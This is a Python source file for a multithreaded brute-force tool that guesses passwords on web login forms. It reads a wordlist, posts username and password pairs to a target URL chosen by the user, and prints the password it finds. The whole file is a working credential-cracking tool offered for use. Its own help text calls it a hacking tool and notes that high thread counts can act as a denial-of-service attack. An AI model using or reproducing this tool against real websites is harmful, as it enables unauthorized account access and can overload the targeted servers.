######################################################################################################
# Title: Brute force                                                                                 #
# Author: Tanvir Hossain Antu                                                                        #
# Github : https://github.com/Antu7                                                                  #
######################################################################################################

import requests
import time
import sys
import os
import concurrent.futures
from argparse import ArgumentParser

from classes.const import *


class Checker:
    def __init__(self, username, url, error, executor):
        self.username = username
        self.url = url
        self.error = error
        self.count = 0
        self.found = ""
        self.executor = executor

    def check_password(self, password):
        if self.found != "":
            return
        
        self.count += 1
        print(f"[{args['threads']}th] Trying Password: {str(self.count)} Time For => {password}")
        data_dict = {args['login_field']: self.username, args['password_field']: password, "Log In":"submit"}
        response = requests.post(self.url, data=data_dict)
        if self.error in str(response.content):
            pass
        elif "csrf" in str(response.content).lower():
            self.found = "csrf"
        else:
            self.found = password


def bruteCracking(username,url,error):
    try:
        # ThreadPoolExecutor provide support for multi threading
        with concurrent.futures.ThreadPoolExecutor(max_workers=int(args['threads'])) as executor:
            checker = Checker(username, url, error, executor)  # Create checker object for password checking
            for password in passwords:
                if checker.found != "":  # Password already found, break the loop
                    break
                password = password.strip()
                # Add call for check_password to thread pool
                executor.submit(checker.check_password, password)
        if checker.found == "csrf":  # Checker.found gets `csrf` value when CSRF is detected on website
            print("CSRF Token Detected!! BruteF0rce Not Working This Website.")
            return
        elif checker.found != "":
            time.sleep(1)  # Wait for all processes to end their job
            print(f"Username: ---> {username}")
            print(f"Password: ---> {checker.found}")
            return
    except:
        print("Some Error Occurred Please Check Your Internet Connection !!")
    print("[!!] password not in list")


# Check if input value is active web URL
def web_url(value: str) -> str:
    # URL must contain http:// or https://
    if "http://" not in value and "https://" not in value:
        print("Please specify addres with correct prefix (http, https)")
        exit()
    try:
        if requests.get(value).status_code != 200:
            raise requests.exceptions.ConnectionError()
    except requests.exceptions.ConnectionError:
        # URL is not active
        print(f"Sorry, {value} is not active!")
        exit()
    return value


# Check if value is valid file path
def file_path(value: str) -> str:
    if not os.path.exists(value) or not os.path.isfile(value):
        print("Specified passwords file does not exist!")
        exit()
    return value


if __name__ == "__main__":
    args = {}
    if "-i" in sys.argv:
        # Interactive mode, user can specify all values from input
        args['url'] = input("Enter Target Url: ")
        args['username'] = input("Enter Target Username: ")
        args['error'] = input("Enter Wrong Password Error Message: ")
        args['login_field'] = input("Enter login field name (in POST request) [def: login]: ")
        args['password_field'] = input("Enter password field name (in POST request) [def: password]: ")
        args['threads'] = input("How many threads to run (recommended 1-5, to high value may trigger DOS attack attempt on website): ")
        if not args['threads'].isnumeric():
            print("This value should be a number!")
            exit()
        args['threads'] = int(args['threads'])
        args['passwords_file'] = input("Path to passwords file [Press enter to use default file]: ")
    else:
        # Non-interactive mode, user must specifiy all required values in terminal arguemnts
        parser = ArgumentParser(description="Brute Force python hacking tool")
        parser.add_argument("url", type=web_url, help="URL of website to perform BF attack on")
        parser.add_argument("username", type=str, help="Username on website form")
        parser.add_argument("error", type=str, help="Website error message when password is wrong")
        parser.add_argument("--login-field", type=str, help="Login field name from POST request on website")
        parser.add_argument("--password-field", type=str, help="Password field name from POST request on website")
        parser.add_argument("--threads", type=int, help="Number of threads to run (recommended 1-5, to high value may trigger DOS attack attempt on website)")
        parser.add_argument("--passwords-file", type=file_path, help="Path to file with passwords")
        args = vars(parser.parse_args())

    # Set default values if user didn't specified any
    args['login_field'] = "login" if not args['login_field'] else args['login_field']
    args['password_field'] = "password" if not args['password_field'] else args['password_field']
    args['passwords_file'] = "passwords.txt" if not args['passwords_file'] else args['passwords_file']

    print(BANNER)  # Print out welcome banner

    # Print out loading screen
    for c in LOADING_BANNER:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.02)

    # Call main function
    with open(args['passwords_file'], "r") as passwords:
        bruteCracking(args['username'],args['url'],args['error'])
